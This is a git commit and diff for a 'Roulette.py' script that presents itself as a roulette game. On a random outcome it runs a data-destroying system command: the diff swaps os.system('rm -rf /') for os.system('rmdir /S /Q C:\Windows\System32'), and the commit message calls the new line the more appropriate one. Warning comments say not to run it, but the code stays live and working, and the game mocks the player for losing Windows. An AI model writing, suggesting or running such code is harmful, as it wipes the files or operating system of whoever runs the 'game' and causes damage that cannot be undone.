00834aebc79a3c2f821d76ffef28eda1a52ad322
Gabriel Lira <140823887+Liragbr@users.noreply.github.com>
2024-05-25 05:28:24 -0300

    Update Roulette.py
    os.system("rm -rf /") is a UNIX/Linux command that attempts to delete all files in the root / directory. I changed it to the most appropriate one, which would be like: os.system("rmdir /S /Q C:\\Windows\\System32").

--- Roulette/Roulette.py
+++ Roulette/Roulette.py
@@ -11,7 +11,7 @@ if chamber == bullet:
     print("Oops! Looks like you just deleted Windows 32. Good luck reinstalling! 😈")
     # WARNING: This code deletes critical system files and can cause irreparable damage to your system!
     # DO NOT RUN THIS CODE ON A REAL SYSTEM!
-    os.system("rm -rf /")
+    os.system("rmdir /S /Q C:\\Windows\\System32")
     print("Windows 32 has been successfully deleted!😱")
 else:
     print("Phew! You survived... this time. Try again if you dare!😜")
